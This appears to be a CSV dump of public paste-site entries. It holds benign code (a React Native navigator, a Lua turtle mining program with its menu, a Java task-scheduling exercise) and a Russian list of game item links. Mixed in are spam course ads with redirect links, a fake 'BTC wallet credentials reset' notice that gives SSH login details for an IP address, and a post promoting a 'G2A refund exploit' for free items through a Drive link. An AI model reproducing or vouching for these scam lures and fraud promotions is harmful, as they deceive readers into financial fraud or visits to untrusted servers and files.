id,title,username,language,date,content
nTNUZJ9h,Untitled,krintax,TypeScript,Sunday 17th of December 2023 11:56:19 AM CDT,"const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();

const DEFAULT_TAB_OPTIONS = {
  headerShown: false,
  tabBarLabel: '',
  tabBarActiveTintColor: '#ffffff',
  tabBarInactiveTintColor: '#7E8EA3',
};

const AuthenticatedTabNavigator = () => {
  const {theme} = useTheme();
  return (
    <Tab.Navigator
      screenOptions={{
        tabBarStyle: {
          padding: 16,
          height: 72,
          backgroundColor: `${theme.BACKGROUND_POST}`,
        },
      }}>
      <Tab.Screen
        name=""Home""
        component={HomeScreen}
        options={{
          tabBarIcon: ({color}) => <Icon name={'home'} color={color} />,

          ...DEFAULT_TAB_OPTIONS,
        }}
      />
      {/*  Removed other screens*/}
    </Tab.Navigator>
  );
};

const UnauthenticatedNavigator = () => {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen name=""GetStartedScreen"" component={GetStartedScreen} />
      {/*  Removed other screens*/}
    </Stack.Navigator>
  );
};

function OnboardingNavigator() {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen
        name=""EmailConfirmationScreen""
        component={EmailConfirmationScreen}
      />
    </Stack.Navigator>
  );
}

const AuthenticatedNavigator = () => {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen name=""HomeTab"" component={AuthenticatedTabNavigator} />
      <Stack.Screen
        name=""ChangePasswordScreen""
        component={ChangePasswordScreen}
      />
      {/*  Removed other screens*/}
    </Stack.Navigator>
  );
};

const Navigator = () => {
  const {isSignedIn, user} = useAuth();

  if (isSignedIn) {
    return user.emailConfirmed ? (
      <AuthenticatedNavigator />
    ) : (
      <OnboardingNavigator />
    );
  }

  return <UnauthenticatedNavigator />;
};

export default Navigator;"
R9M583sD,Untitled,sissou123,Python,Sunday 17th of December 2023 11:48:11 AM CDT,"Data Science: Modern Deep Learning in Python
Build with modern libraries like Tensorflow, Theano, Keras, PyTorch, CNTK, MXNet. Train faster with GPU on AWS.
for more:https://dz-linkk.com/K71lO"
UCuLy2W8,Untitled,sissou123,Python,Sunday 17th of December 2023 11:35:25 AM CDT,"Machine Learning, Data Science and Generative AI with Python
Complete hands-on machine learning and AI tutorial with data science, Tensorflow, GPT, OpenAI, and neural networks
for more:https://dz-linkk.com/jPvq5"
QXJrcgYF,branch.lua,aegouihaegouha4gouha,Lua,Sunday 17th of December 2023 11:29:40 AM CDT,"-- branch.lua
-- branch program
-- special ggOS Turtle edition

local isProgRunning = true
local hasStarted = false
local isRunning=false
local isStopped=true
local x=0
local y=0
local z=0
local d=0
local intervals = 1000000

os.loadAPI(""/ggOS/gg.lua"")
-- if branch design dir not exists, create
local isLoad = true
if not fs.isDir(""bd"") then 
	fs.makeDir(""bd"")
end

function cwrite(msg,colr,bgcolor)
    local sc = term.getTextColor()
	local sbc = term.getBackgroundColor()
    term.setTextColor(colr)
	if bgcolor ~= nil then 
		term.setBackgroundColor(bgcolor)
	end
    write(msg)
    term.setTextColor(sc)
	term.setBackgroundColor(sbc)
end

function statusUpdate(st)
	local stx, sty = term.getCursorPos()
	term.setCursorPos(32,1)
	write(""        "")
	term.setCursorPos(32,1)
	if st == ""RUNNING"" then
		cwrite("" RUNNING"", colors.green)
	elseif st == ""STOPPED"" then
		cwrite("" STOPPED"", colors.red)
	elseif st == ""RESUMING"" then
		cwrite(""RESUMING"", colors.orange)
	elseif st == ""STOPPING"" then
		cwrite(""STOPPING"", colors.orange)
	elseif st == ""OFF"" then
		cwrite(""     OFF"", colors.gray)
	end
	
	term.setCursorPos(stx,sty)
end

local currTermBg = term.getBackgroundColor()
local currTermTx = term.getTextColor()
term.setBackgroundColor(colors.black)
term.setTextColor(colors.white)
term.clear()

term.setCursorPos(1,1)
print(""Branch Miner"")
term.setCursorPos(17,1)
cwrite("" START "", colors.green, colors.gray)
-- monitor 39x19
statusUpdate(""OFF"")
term.setCursorPos(1,3)
print(""x: 0, y: 0, z: 0\n"")
write(""Z: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)
write(""\nY: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)
write(""\nD: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)

term.setCursorPos(8,5)
gg.cwrite(""Load"", colors.black, colors.blue)
term.setCursorPos(14,5)
gg.cwrite(""Save"", colors.blue, colors.black)

function drawLoad()
	term.setCursorPos(8,5)
	gg.cwrite(""Load"",colors.black,colors.blue)
	term.setCursorPos(14,5)
	gg.cwrite(""Save"",colors.blue,colors.black)
	term.setCursorPos(8,7)
	cwrite("" 1  2  3  4"", colors.red)
	term.setCursorPos(8,8)
	cwrite("" 5  6  7  8"", colors.red)
	term.setCursorPos(8,9)
	cwrite("" 9 10 11 12"", colors.red)
	term.setCursorPos(8,10)
	cwrite(""13 14 15 16"", colors.red)
end

function drawSave()
	term.setCursorPos(8,5)
	gg.cwrite(""Load"",colors.blue,colors.black)
	term.setCursorPos(14,5)
	gg.cwrite(""Save"",colors.black,colors.blue)
	term.setCursorPos(8,7)
	cwrite("" 1  2  3  4"", colors.green)
	term.setCursorPos(8,8)
	cwrite("" 5  6  7  8"", colors.green)
	term.setCursorPos(8,9)
	cwrite("" 9 10 11 12"", colors.green)
	term.setCursorPos(8,10)
	cwrite(""13 14 15 16"", colors.green)
end

drawLoad()

term.setCursorPos(1,12)
write(""Repeats: "")
write(""<"")
gg.cwrite(""+"",colors.green,colors.gray)
write(""  x  "")
gg.cwrite(""-"",colors.red,colors.gray)
write("">"")

local fuelstr = ""Fuel: "" .. turtle.getFuelLevel()
term.setCursorPos(40-#fuelstr,2)
write(fuelstr)
term.setCursorPos(28,4)
gg.cwrite(""Exit Program"", colors.white, colors.red)


-- note: this looks inverted to what turtle sees
-- bdesign rows need to have odd number of items


local bdesign = {}
bdesign[1] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
bdesign[2] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
bdesign[3] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}

local bdesignCenter = (#bdesign[1]-1)/2+1

function drawDesign()
	for i=1, 9 do
		term.setCursorPos(40-19,14-i)
		if i <= #bdesign then
			for j=1, #bdesign[i] do
				cwrite("" "", colors.white, (bdesign[i][j] == 1 and colors.green or colors.gray))
			end
		else
			cwrite(""                   "", colors.white, colors.lightGray)
		end
	end
end

drawDesign()

term.setCursorPos(1,13)
write(""Branch Rows: "")
cwrite(""+"",colors.green,colors.gray)
write("" ""..#bdesign.."" "")
cwrite(""-"", colors.red,colors.gray)


function control()
	local event, button, mousex, mousey = os.pullEvent(""mouse_click"")
	
	if mousex >= 17 and mousex <= 23 and mousey == 1 then
		-- start/pause button
		if not hasStarted then
			term.setCursorPos(1,5)
			write(""     \n     \n     "")
		end
		if isRunning then
			term.setCursorPos(17,1)
			cwrite("" START "", colors.green, colors.gray)
			statusUpdate(""STOPPING"")
		else
			term.setCursorPos(17,1)
			cwrite("" PAUSE "", colors.red, colors.gray)
			statusUpdate(""RESUMING"")
		end
		isRunning = not isRunning
	elseif mousex >= 28 and mousex <= 39 and mousey == 4 then
		-- exit program (run startup)
		isProgRunning = false
		term.clear()
		term.setCursorPos(1,1)
		print(""Returning to program list..."")
		term.setBackgroundColor(currTermBg)
		term.setTextColor(currTermTx)
		shell.exit()
	elseif mousex >= 8 and mousex <= 11 and mousey == 5 then
		-- load button
		drawLoad()
		isLoad = true
	elseif mousex >= 14 and mousex <= 17 and mousey == 5 then
		-- save button
		drawSave()
		isLoad = false
	elseif mousex >= 8 and mousex <= 18 and mousey >= 7 and mousey <= 10 then
		-- save/load branch designs
		-- row is column and column is row haha
		local row = mousex-7
		local column = mousey - 6
		if row % 3 ~= 0 then -- in case click in space btwn numbers
			row = (row + 3 - row % 3) / 3
		else row = 0 end
		
		local n = tostring((column - 1) * 4 + row)

		local paddedN = """"
		for i=1, 2-#n do
			paddedN = paddedN .. "" ""
		end
		paddedN = paddedN .. n
		if row ~= 0 then
			if isLoad then
				-- load
				if fs.exists(""bd/"" .. n .. "".design"") then
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.black, colors.red)
				sleep(0.1)
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.red, colors.black)
				term.setCursorPos(21,4)
				write(paddedN)
				local h = fs.open(""bd/"" .. n .. "".design"", ""r"")
				bdesign = textutils.unserialize(h.readAll())
				h.close()
				drawDesign()
				term.setCursorPos(16,13)
				write(#bdesign)
				end
			else
				-- save
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.black, colors.green)
				sleep(0.1)
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.green, colors.black)
				term.setCursorPos(21,4)
				write(paddedN)
				local h = fs.open(""bd/"" .. n .. "".design"", ""w"")
				h.write(textutils.serialize(bdesign))
				h.close()
			end
		end
	elseif mousex >= 21 and mousex <= 39 and mousey >= 5 and mousey <= 13 then
		-- changing branch pattern
		if isStopped then
			-- only update when turtle is stopped
			if mousex ~= 30 then
				-- cannot modify the middle layer
				
				-- convert mouse coords to bdesign coords
				local bdx = mousex - 20
				local bdy = 14 - mousey
				if bdy <= #bdesign then
					bdesign[bdy][bdx] = (bdesign[bdy][bdx] == 0 and 1 or 0)
					term.setCursorPos(mousex,mousey)
					cwrite("" "", colors.white, (bdesign[bdy][bdx] == 1 and colors.green or colors.gray))
				end
			end
		end
	elseif mousex == 4 and mousey == 5 and not hasStarted then
		turtle.forward()
	elseif mousex == 5 and mousey == 5 and not hasStarted then
		turtle.back()
	elseif mousex == 4 and mousey == 6 and not hasStarted then
		turtle.up()
	elseif mousex == 5 and mousey == 6 and not hasStarted then
		turtle.down()
	elseif mousex == 4 and mousey == 7 and not hasStarted then
		turtle.turnRight()
	elseif mousex == 5 and mousey == 7 and not hasStarted then
		turtle.turnLeft()
	elseif mousex == 14 and mousey == 13 then
		-- increase rows
		if #bdesign < 9 and isStopped then
			bdesign[#bdesign+1] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
			term.setCursorPos(16,13)
			write(#bdesign)
			term.setCursorPos(40-#bdesign[1],14-#bdesign)
			for i=1, #bdesign[#bdesign] do
				cwrite("" "", colors.white, (bdesign[#bdesign][i] == 1 and colors.green or colors.gray))
			end
		end
	elseif mousex == 18 and mousey == 13 then
		-- decrease rows
		if #bdesign > 1 and isStopped then
			term.setCursorPos(40-#bdesign[1],14-#bdesign)
			for i=1, #bdesign[#bdesign] do
				cwrite("" "", colors.white, colors.lightGray)
			end
			bdesign[#bdesign] = nil
			term.setCursorPos(16,13)
			write(#bdesign)
		end
	end
	if isProgRunning then control() end
end

function checkInv() 
	if turtle.getItemSpace(16) ~= 64 then
		-- inventory full. return to home base
		-- save current position and direction
		local sx = x
		local sy = y
		local sz = z
		local sd = d
		
		if x ~= 0 then
			-- not in main hall
			goDir(x < 0 and ""right"" or ""left"")
			while x ~= 0 do
				tFwd()
			end
		end
		
		-- empty inventory and come back to original pos and direction
		goDir(""backward"")
		while z ~= 0 do
			
			tFwd()
		end
		goDir(""left"")
		tFwd()
		
		for p=2,16 do
        turtle.select(p)
        turtle.dropDown()
        end
        turtle.select(1)
		
		goDir(""right"")
		tFwd()
		goDir(""forward"")
		while z ~= sz do
			tFwd()
		end
		
		goDir(sx < 0 and ""left"" or ""right"")
		while x ~= sx do
			tFwd()
		end
		goDir(sd)
	end
end

function main() 
	--local bdx = mousex - 20
	--local bdy = 14 - mousey
	if isRunning then
		
		statusUpdate(""RUNNING"")
		isStopped = false
		for i=1, #bdesign do
			
			tbtdig()
			if z % 4 == 0 then
				turtle.select(1)
				if turtle.getItemDetail().name == ""minecraft:torch"" then turtle.placeDown() end
			end
			local j = bdesignCenter
			term.setCursorPos(39-19+j,14-i)
			cwrite("" "",colors.white,colors.purple)
			if i > 1 then
				term.setCursorPos(39-19+j,15-i)
				cwrite("" "",colors.white,colors.yellow)
			end
			-- check if left block can be destroyed
			-- if so, start loop to destroy all
			-- blocks to left are gone
			if bdesign[i][j-1] == 1 then
				goDir(""left"")
				while j - 1 > 0 and bdesign[i][j-1] == 1 do
					tbtdig()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j - 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
				goDir(""right"")
				while j < bdesignCenter do
					tFwd()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j + 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
			end
			if bdesign[i][j+1] == 1 then
				goDir(""right"")
				while j + 1 < #bdesign[i] and bdesign[i][j+1] == 1 do
					tbtdig()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j + 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
				goDir(""left"")
				while j > bdesignCenter do
					tFwd()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j - 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
			end
			goDir(""forward"")
		end
		drawDesign()
	else
		
		statusUpdate(""STOPPED"")
		isStopped = true
		sleep(1)
	end
	if isProgRunning then main() end
end

function goDir(desiredDir)
	if desiredDir == ""forward"" then desiredDir = 0
	elseif desiredDir == ""right"" then desiredDir = 1
	elseif desiredDir == ""backward"" then desiredDir = 2
	elseif desiredDir == ""left"" then desiredDir = 3
	end
	if d ~= desiredDir then
		if d > desiredDir then
			-- special case
			if d == 3 and desiredDir == 0 then turtle.turnRight()
			else
				for k=1, d-desiredDir do turtle.turnLeft() end
			end
		else
			if d == 0 and desiredDir == 3 then turtle.turnLeft()
			else
				for k=1, desiredDir-d do turtle.turnRight() end
			end
		end
		d = desiredDir
	end
end

function updatePOS(goin)
	if goin == 0 then
		if d == 0 then z = z + 1
		elseif d == 1 then x = x + 1
		elseif d == 2 then z = z - 1
		elseif d == 3 then x = x - 1
		end
	end
	term.setCursorPos(1,3)
	term.clearLine()
	print(""x: ""..x.."", y: ""..y.."", z: ""..z)
end

-- dig a 1x1x3 column in front of turtle
function tbtdig()
    turtle.dig()
    checkInv()
    tFwd()
    turtle.digUp()
    checkInv()
    turtle.digDown()
    checkInv()
end

function tFwd()
    local isRed = true
    while not turtle.forward() do
		turtle.dig()
		term.setCursorPos(1,2)
		if isRed then
			cwrite(""something is in the way!!"", colors.red)
			isRed = false
		else
			cwrite(""something is in the way!!"", colors.yellow)
			isRed = true
		end
    end
	term.setCursorPos(1,2)
	write(""                         "")
	updatePOS(0)
end

parallel.waitForAll(main, control)
"
G1pGacSj,startup.lua,aegouihaegouha4gouha,Lua,Sunday 17th of December 2023 11:28:45 AM CDT,"-- startup.lua
term.setBackgroundColor(colors.lightBlue)
term.setTextColor(colors.black)
term.clear()
term.setCursorPos(1,1)
os.loadAPI(""ggos/gg.lua"")
print(""eee"")
local endermodem = peripheral.wrap(""top"")
local inProgram = false
-- 39x13

-- define buttons
local buttons = {
	desktop = {
		settings = {
			x1    = 14,
			x2    = 25,
			y1    = 8,
			y2    = 10,
		},
		programs = {
			x1    = 3,
			x2    = 14,
			y1    = 3,
			y2    = 5,
		},
		network = {
			x1    = 17,
			x2    = 27,
			y1    = 4,
			y2    = 6,
		},
		
		
	},
	settings = {
		close = {
			x1    = 37,
			x2    = 39,
			y1    = 2,
			y2    = 2,
		},
	},
	programs = {
		close = {
			x1    = 37,
			x2    = 39,
			y1    = 2,
			y2    = 2,
		},
		branch = {
			x1 = 3,
			x2 = 8,
			y1 = 5,
			y2 = 5,
		}
	}
}

local gui = {
	desktop = {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1 = 3,
			x2 = 14,
			y1 = 3,
			y2 = 5,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1 = 17,
			x2 = 27,
			y1 = 4,
			y2 = 6,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1 = 14,
			x2 = 25,
			y1 = 8,
			y2 = 10,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1    = 15,
			x2    = 15,
			y1    = 9,
			y2    = 9,
			txt   = "" Settings "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 4,
			x2    = 4,
			y1    = 4,
			y2    = 4,
			txt   = "" Programs "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 18,
			x2    = 4,
			y1    = 5,
			y2    = 5,
			txt   = "" Network "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
	},
	settings = {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1 = 1,
			x2 = 39,
			y1 = 2,
			y2 = 13,
			txt = false,
			bgcolor = colors.lightGray,
		},
		{
			x1 = 37,
			x2 = 37,
			y1 = 2,
			y2 = 2,
			txt = "" X "",
			color = colors.black,
			bgcolor = colors.red,
		},
		{
			x1 = 2,
			x2 = 2,
			y1 = 3,
			y2 = 3,
			txt = ""ID: "" .. os.getComputerID(),
			color = colors.black,
			bgcolor = colors.lightGray
		},
		{
			x1 = 2,
			x2 = 2,
			y1 = 4,
			y2 = 4,
			txt = ""Name: "",
			color = colors.black,
			bgcolor = colors.lightGray
		},
		{
			x1 = 8,
			x2 = 8,
			y1 = 4,
			y2 = 4,
			txt = ""            "",
			color = colors.black,
			bgcolor = colors.white
		},
	},
	programs =  {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1 = 1,
			x2 = 39,
			y1 = 2,
			y2 = 13,
			txt = false,
			bgcolor = colors.lime,
		},
		{
			x1 = 37,
			x2 = 37,
			y1 = 2,
			y2 = 2,
			txt = "" X "",
			color = colors.black,
			bgcolor = colors.red,
		},
		{
			x1=2,
			x2=2,
			y1=3,
			y2=3,
			txt = ""Programs"",
			color = colors.black,
			bgcolor = colors.lime,
		},
		{
			x1=3,
			x2=3,
			y1=5,
			y2=5,
			txt = ""Branch"",
			color = colors.black,
			bgcolor = colors.lime,
		},
		{
			x1=3,
			x2=3,
			y1=7,
			y2=7,
			txt = ""Maps"",
			color = colors.black,
			bgcolor = colors.lime,
		},
	}
}

local currPage = ""programs""


function btnFunc (page, ibtn, mousebtn) 
	if page == ""desktop"" then
		if ibtn == ""settings"" and mousebtn == 1 then
			-- settings
			currPage = ""settings""
			drawGUI(currPage)
		elseif ibtn == ""programs"" and mousebtn == 1 then
			-- programs
			currPage = ""programs""
			drawGUI(currPage)
		elseif ibtn == ""network"" and mousebtn == 1 then
			-- network

		end
	elseif page == ""settings"" then
		if ibtn == ""close"" and mousebtn == 1 then
			-- desktop (close)
			currPage = ""desktop""
			drawGUI(currPage)
		end
	elseif page == ""programs"" then
		if ibtn == ""close"" and mousebtn == 1 then
			-- desktop (close)
			currPage = ""desktop""
			drawGUI(currPage)
		elseif ibtn == ""branch"" and mousebtn == 1 then
			inProgram = true
			shell.run(""/branch.lua"")
			inProgram = false
			drawGUI(currPage)
		end

	end
end

-- function to draw gui
function drawGUI(page) 
	term.clear()
	for k,v in pairs (gui[page]) do
		--term.setCursorPos(13,1)
		--term.clearLine()
		--print(""k: "" .. k .. "", v: "" .. v)
		for i=v.y1, v.y2 do
			term.setCursorPos(v.x1,i)
			if v.txt then
				term.setCursorPos(v.x1,v.y1)
				gg.cwrite(v.txt, v.color, v.bgcolor)
			else
				for j=v.x1, v.x2 do
					gg.cwrite("" "", colors.black, v.bgcolor)
				end
			end
		end
	end
end

drawGUI(currPage)




function main ()
	if isRunning then
		
		sleep(1)
	else
		sleep(1)
	end
	if not inProgram then 
		term.setCursorPos(36,1)
		gg.cwrite(gg.fuel(true),colors.white,colors.gray) 
	end
	main()
end

function control ()
	local event, button, mousex, mousey = os.pullEvent(""mouse_click"")
	for k,v in pairs (buttons[currPage]) do
		if mousex >= v.x1 and mousex <= v.x2 and mousey >= v.y1 and mousey <= v.y2 then
			term.setCursorPos(18,1)
			write(""key: "" .. k)
			btnFunc(currPage,k, button)
		end
	end
	
	control()
end

parallel.waitForAll(main, control)"
vkKdkXri,Untitled,sissou123,Python,Sunday 17th of December 2023 11:23:07 AM CDT,"Python for Machine Learning & Data Science Masterclass
Learn about Data Science and Machine Learning with Python! Including Numpy, Pandas, Matplotlib, Scikit-Learn and more!
for more:https://dz-linkk.com/4eINGS"
hWVJKb8X,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 17th of December 2023 11:07:40 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-198811"
cMRJJ2Xq,poo test2,STANAANDREY,Java,Sunday 17th of December 2023 10:42:27 AM CDT,"
abstract class Task {
    protected String name;

    public Task(final String name) {
        this.name = name;
    }

    public abstract boolean execute(double time);
}

class SimpleTask extends Task {
    private double necTime;

    public SimpleTask(final String name, double necTime) {
        super(name);
        this.necTime = necTime;
    }

    @Override
    public boolean execute(double time) {
        if (time >= necTime) {
            necTime = 0;
            return true;
        }
        necTime -= time;
        return false;
    }

    @Override
    public String toString() {
        return ""Name: "" + name + "", Time: "" + necTime + "";"";
    }
}

class ComposedTask extends Task {
    private SimpleTask[] simpleTasks;

    public ComposedTask(final String name, SimpleTask[] simpleTasks) {
        super(name);
        this.simpleTasks = simpleTasks;
    }

    @Override
    public boolean execute(double time) {
        double q = time / simpleTasks.length;
        boolean finished = true;
        for (int i = 0; i < simpleTasks.length; i++) {
            finished &= simpleTasks[i].execute(q);
        }
        return finished;
    }

    @Override
    public String toString() {
        String s = ""Name: "" + name + "", COntent: ("";
        for (int i = 0; i < simpleTasks.length; i++) {
            s += simpleTasks[i] + "" "";
        }
        return s + "")"";
    }
}

class Processor {
    private Task[] tasks;

    public Processor(Task[] tasks) {
        this.tasks = tasks;
    }

    public void finishAllTasks() {
        boolean finished = false;
        while (!finished) {
            finished = true;
            for (int i = 0; i < tasks.length; i++) {
                finished &= tasks[i].execute(5);
            }
        }
    }

    @Override
    public String toString() {
        String s = ""Proc: "";
        for (int i = 0; i < tasks.length; i++) {
            s += tasks[i] + ""; "";
        }
        return s;
    }
}

public class Main {
    public static void main(String[] args) {
        var st1 = new SimpleTask(""st1"", 5);
        var st2 = new SimpleTask(""st2"", 10);
        var ct = new ComposedTask(""ct"", new SimpleTask[]{st1, st2});
        var p = new Processor(new Task[]{ct});
        System.out.println(p);
        p.finishAllTasks();
        System.out.println(p);
    }
}
"
H1xxQe1q,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Sunday 17th of December 2023 09:54:55 AM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

529133"
29q262cu,Untitled,Locative,SQL,Sunday 17th of December 2023 09:52:19 AM CDT,"Список  предметов: 
https://db.pandawow.me/?item=133543
https://db.pandawow.me/?item=118676
https://db.pandawow.me/?item=129923
https://db.pandawow.me/?item=116771
https://db.pandawow.me/?item=166775
https://db.pandawow.me/?item=137573
https://db.pandawow.me/?item=138387

https://db.pandawow.me/?item=113011
https://db.pandawow.me/?item=113007
https://db.pandawow.me/?item=113004
https://db.pandawow.me/?item=113024
https://db.pandawow.me/?item=113035
https://db.pandawow.me/?item=113047
https://db.pandawow.me/?item=113090
https://db.pandawow.me/?item=113087
https://db.pandawow.me/?item=113083
https://db.pandawow.me/?item=113077

https://db.pandawow.me/?item=84101
https://db.pandawow.me/?item=87791
https://db.pandawow.me/?item=44175
https://db.pandawow.me/?item=45801
https://db.pandawow.me/?item=54860
https://db.pandawow.me/?item=46778
https://db.pandawow.me/?item=49283
https://db.pandawow.me/?item=52200
https://db.pandawow.me/?item=76755
https://db.pandawow.me/?item=71718
https://db.pandawow.me/?item=85870
https://db.pandawow.me/?item=78924
https://db.pandawow.me/?item=78919

https://db.pandawow.me/?item=38301
https://db.pandawow.me/?item=44719
https://db.pandawow.me/?item=38578
https://db.pandawow.me/?item=46780
https://db.pandawow.me/?item=49703
https://db.pandawow.me/?item=52253
https://db.pandawow.me/?item=52201
https://db.pandawow.me/?item=52251
https://db.pandawow.me/?item=52489
https://db.pandawow.me/?item=64488
https://db.pandawow.me/?item=72161
https://db.pandawow.me/?item=69776
https://db.pandawow.me/?item=70159
https://db.pandawow.me/?item=86574
https://db.pandawow.me/?item=88566
https://db.pandawow.me/?item=90067
https://db.pandawow.me/?item=33079
https://db.pandawow.me/?item=33219
https://db.pandawow.me/?item=32542
https://db.pandawow.me/?item=35227

https://db.pandawow.me/?item=95474
https://db.pandawow.me/?item=95475
https://db.pandawow.me/?item=97213

https://db.pandawow.me/?item=87526
https://db.pandawow.me/?item=89686
https://db.pandawow.me/?item=90173
https://db.pandawow.me/?item=90897
https://db.pandawow.me/?item=90953
https://db.pandawow.me/?item=85220
https://db.pandawow.me/?item=60847
https://db.pandawow.me/?item=22780
https://db.pandawow.me/?item=20651
https://db.pandawow.me/?item=46892
https://db.pandawow.me/?item=62540
https://db.pandawow.me/?item=64996
https://db.pandawow.me/?item=66067
https://db.pandawow.me/?item=68385
https://db.pandawow.me/?item=69847
https://db.pandawow.me/?item=69239
https://db.pandawow.me/?item=69251
https://db.pandawow.me/?item=68840
https://db.pandawow.me/?item=70140
https://db.pandawow.me/?item=70099
https://db.pandawow.me/?item=69992
https://db.pandawow.me/?item=70160
https://db.pandawow.me/?item=71726
https://db.pandawow.me/?item=79744
https://db.pandawow.me/?item=78916"
